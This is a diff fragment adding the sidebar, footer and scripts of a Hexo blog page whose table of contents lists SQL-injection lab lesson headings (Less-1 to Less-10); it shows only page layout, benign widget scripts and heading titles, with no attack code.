+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00  前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E4%BF%AE%E7%82%BC"><span class="nav-number">2.</span> <span class="nav-text">0x01  修炼</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-1-GET-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-%E5%8D%95%E5%BC%95%E5%8F%B7-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.0.1.</span> <span class="nav-text">Less-1 GET-基于错误的-单引号-字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-2-GET-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="nav-number">2.0.2.</span> <span class="nav-text">Less-2 GET-基于错误的-数字型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-3-GET-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E7%9A%84%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.0.3.</span> <span class="nav-text">Less-3 GET-基于错误的-单引号变形的字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-4-GET-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.0.4.</span> <span class="nav-text">Less-4 GET-基于错误的-双引号字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-5-GET-%E5%8F%8C%E6%B3%A8%E5%85%A5-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.0.5.</span> <span class="nav-text">Less-5 GET-双注入-单引号字符型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.0.5.1.</span> <span class="nav-text">一、盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8C%E6%B3%A8%E5%85%A5"><span class="nav-number">2.0.5.2.</span> <span class="nav-text">双注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LESS-6-GET-%E5%8F%8C%E6%B3%A8%E5%85%A5-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.0.6.</span> <span class="nav-text">LESS-6 GET-双注入-双引号字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LESS-7-GET-%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.0.7.</span> <span class="nav-text">LESS-7 GET-导出文件-字符型注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.1.</span> <span class="nav-text">-</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LESS-8-GET-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.1.</span> <span class="nav-text">LESS-8 GET-布尔盲注-单引号字符型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">2.1.1.0.1.</span> <span class="nav-text">知识点</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LESS-9-GET-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.2.</span> <span class="nav-text">LESS-9 GET-基于时间的盲注-单引号字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LESS-10-GET-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.3.</span> <span class="nav-text">LESS-10 GET-基于时间的盲注-双引号字符型注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#END"><span class="nav-number">3.</span> <span class="nav-text">END</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yq1ng"
+      src="/images/xiaoxin.jpg">
+  <p class="site-author-name" itemprop="name">yq1ng</p>
+  <div class="site-description" itemprop="description">The best way to know your strength is to fight</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yq1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yq1ng" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/weixin_43578492" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43578492" rel="noopener" target="_blank"><i class="crosshairs fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yq1ng</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">47k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:19</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<br /> #换行
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("09/27/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
